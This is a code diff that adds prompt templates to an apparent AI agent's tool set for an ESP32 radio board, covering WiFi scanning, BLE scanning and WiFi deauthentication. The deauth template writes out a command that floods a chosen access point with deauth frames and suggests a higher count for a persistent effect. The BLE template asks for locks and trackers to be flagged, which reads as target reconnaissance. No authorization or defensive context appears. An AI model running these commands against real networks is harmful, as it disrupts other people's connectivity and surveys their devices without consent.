@@ -334,4 +334,42 @@ Note: dump1090-mutability MUST be started via systemctl, NOT called directly wit
 Note: ADS-B data is served at http://localhost/dump1090/data/aircraft.json (lighttpd port 80).
 Compile: active frequencies, device types, signal strengths, anomalies.
 """,
+
+    "esp32_scan": """
+WiFi AP scan via ESP32 PinPulse Shield (ThyraESP32 firmware, USB CDC serial).
+The ESP32 is accessible at /dev/ttyACM0 (auto-detected by esp32_controller.py).
+Command:
+python3 ~/agent/tools/esp32_controller.py
+Or send directly:
+python3 -c "from tools.esp32_controller import wifi_scan; import json; r=wifi_scan(); print(json.dumps(r['data'], indent=2))" 2>/dev/null | tee /tmp/thyra_output/esp32_scan.json
+Report: all visible APs with SSID, BSSID, channel, RSSI, encryption type.
+""",
+
+    "esp32_deauth": """
+Send deauth frames to a target AP via ESP32 PinPulse Shield.
+Target BSSID: {bssid}, Channel: {channel}
+Command:
+python3 -c "
+from tools.esp32_controller import deauth
+import json
+r = deauth('{bssid}', {channel}, 50)
+print(json.dumps(r, indent=2))
+" 2>/dev/null | tee /tmp/thyra_output/esp32_deauth.json
+Note: ESP32 must be on /dev/ttyACM0. Run esp32_scan first to confirm target AP details.
+Note: count=50 sends 50 deauth frames. Increase for persistent effect.
+Report: sent count, BSSID, channel from JSON response.
+""",
+
+    "esp32_ble": """
+Scan for BLE devices via ESP32 PinPulse Shield.
+Scan duration: {target} seconds (default 5).
+Command:
+python3 -c "
+from tools.esp32_controller import ble_scan
+import json
+r = ble_scan({target})
+print(json.dumps(r.get('data', r.get('raw', [])), indent=2))
+" 2>/dev/null | tee /tmp/thyra_output/esp32_ble.json
+Report: BLE device addresses, RSSI, names. Flag any interesting devices (fitness trackers, locks, industrial sensors).
+""",
 }
